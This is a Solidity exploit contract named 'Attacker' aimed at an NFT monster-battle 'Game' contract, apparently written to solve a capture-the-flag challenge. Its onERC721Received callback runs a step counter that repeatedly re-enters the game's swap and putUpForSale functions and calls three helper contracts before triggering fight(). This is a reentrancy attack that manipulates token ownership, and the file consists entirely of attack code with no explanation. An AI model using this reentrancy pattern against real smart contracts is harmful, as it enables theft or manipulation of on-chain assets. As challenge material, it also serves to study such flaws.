pragma solidity 0.8.12;

interface Helper {
    function swap1(address) external;
    function swap2(address) external;
    function swap3(address) external;
    function start(address _attacker) external;

}


interface Game {

    function join() external returns (uint256[3] memory);
    function putUpForSale(uint256 _monId) external;
    function fight() external;
    function balanceOf(address owner) external returns (uint256);
    function decks(address owner,uint id) external returns (uint256 tokenID);
    function swap(address _to, uint256 _monId1, uint256 _monId2) external;
}


contract Attacker {


address public helper;
address public helper2;
address public helper3;
address public game;
uint public steps;


constructor(address _game,address _helper,address _helper2,address _helper3)  {
    game = _game;
    helper = _helper;
    helper2 = _helper2;
    helper3 = _helper3;

}


function prepare() external {
    
    Game(game).join();
    
    
}

function attack() external {

    Game(game).swap(helper3,3,6);
}

function onERC721Received(address operator,address from,uint256 tokenId,bytes calldata data) external returns (bytes4){
if(steps == 0) {
    steps = steps + 1;
    Game(game).swap(helper3,4,7);
    

}
if(steps == 1) {
    steps = steps + 1;
    Game(game).swap(helper3,5,8);

    

}

if (steps== 2) {
// start swap
    steps = steps + 1;
    
        Game(game).putUpForSale(6);
        Game(game).putUpForSale(7);
        Game(game).putUpForSale(8);
        Helper(helper2).start(address(this));
    }

if(steps == 3) {
    
    steps = steps + 1;
    Helper(helper2).swap2(address(this));
    

}

if (steps==4) {
 steps = steps + 1;
    
    Helper(helper2).swap3(address(this));

}

if (steps==5) {
    steps = steps + 1;
    Game(game).putUpForSale(12);
    Helper(helper).swap1(address(this));

}
if (steps == 6) {
 
    steps = steps + 1;

    Game(game).fight();
}





return 0x150b7a02;
    }

}
